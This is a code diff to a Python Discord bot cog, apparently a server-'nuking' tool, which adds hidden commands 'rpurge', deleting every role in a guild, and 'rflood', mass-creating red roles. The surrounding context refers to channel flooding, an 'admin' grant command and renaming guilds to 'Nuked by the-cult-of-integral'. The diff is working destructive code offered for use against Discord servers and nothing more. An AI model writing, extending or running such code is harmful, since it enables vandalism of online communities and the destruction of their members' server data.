@@ -220,6 +220,76 @@ class Cmds(commands.Cog):
         self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.CFLOOD.value)
         return
     
+    async def rpurge(self, **kwargs):
+        """Deletes all roles in the server.
+
+        Kwargs to pass:
+            guild_id (int): the guild id
+        """
+        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
+        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.RPURGE.value)
+        self.bot.qthread.signal_append_hterminal.emit('Purging Server Roles')
+
+        guild_id = kwargs.get('guild_id', None)
+
+        guild = self.bot.get_guild(guild_id)
+
+        old_roles = guild.roles
+        results = await asyncio.gather(
+            *[r.delete() for r in guild.roles],
+            return_exceptions=True)
+        
+        for result, role in zip(results, old_roles):
+            if isinstance(result, Exception):
+                self.bot.qthread.signal_append_hterminal.emit(f'Failed to delete role {role.name}')
+                lu.swarning(f'Failed to delete role {role.name}: {result}')
+            # ? For some reason, if a role cannot be deleted due it being above the bot's role, it does not raise an exception.
+            # ? Furthermore, regular roles that are deleted successfully are not appended to the terminal, only failed deletions are.
+            # ? To avoid confusion, this code block is commented out.
+            # else:
+            #     self.bot.qthread.signal_append_hterminal.emit(f'Deleted role {role.name}')
+            #     lu.sinfo(f'Deleted role {role.name}')
+
+
+        self.bot.qthread.signal_append_hterminal.emit('Finished Purging Server Roles')
+        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.RPURGE.value)
+        return
+    
+    async def rflood(self, **kwargs):
+        """Creates a number of roles in the server.
+
+        Kwargs to pass:
+            guild_id (int): the guild id
+            amount (int): the number of channels to create
+            name (str): the name of the channels
+        """
+        time_fmt_str = time.strftime('%H:%M:%S', time.localtime())
+        self.__add_to_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.RFLOOD.value)
+        self.bot.qthread.signal_append_hterminal.emit('Flooding Server with Roles')
+        
+        guild_id = kwargs.get('guild_id', None)
+        amount = kwargs.get('amount', None)
+        name = kwargs.get('name', None)
+        guild = self.bot.get_guild(guild_id)
+
+        old_roles = guild.roles
+        results = await asyncio.gather(
+            *[guild.create_role(name=name, permissions=discord.Permissions.none(), color=0xff0000) for _ in range(amount)], 
+            return_exceptions=True)
+        
+        new_roles = [r for r in guild.roles if r not in old_roles]
+        for result, role in zip(results, new_roles):
+            if isinstance(result, Exception):
+                self.bot.qthread.signal_append_hterminal.emit(f'Failed to create role {role.name}')
+                lu.swarning(f'Failed to create role {role.name}: {result}')
+            else:
+                self.bot.qthread.signal_append_hterminal.emit(f'Created role {role.name}')
+                lu.sinfo(f'Created role {role.name}')
+                
+        self.bot.qthread.signal_append_hterminal.emit('Finished Flooding Server with Roles')
+        self.__remove_from_running_command_names(time_fmt_str + ' - ' + EH_HiddenCommands_FriendlyNames.RFLOOD.value)
+        return
+    
     async def admin(self, **kwargs):
         """Gives a member a new admin role.
 
@@ -534,8 +604,6 @@ class Cmds(commands.Cog):
                 lu.sinfo(f'Deleted sticker {sticker.name} from guild {guild.name}')
         
         self.bot.qthread.signal_append_hterminal.emit(f'Editing Guild')
-
-        # import pdb; pdb.set_trace()
 
         if not new_guild_title or len(new_guild_title) < 2 or len(new_guild_title) > 100:
             new_guild_title = 'Nuked by the-cult-of-integral'
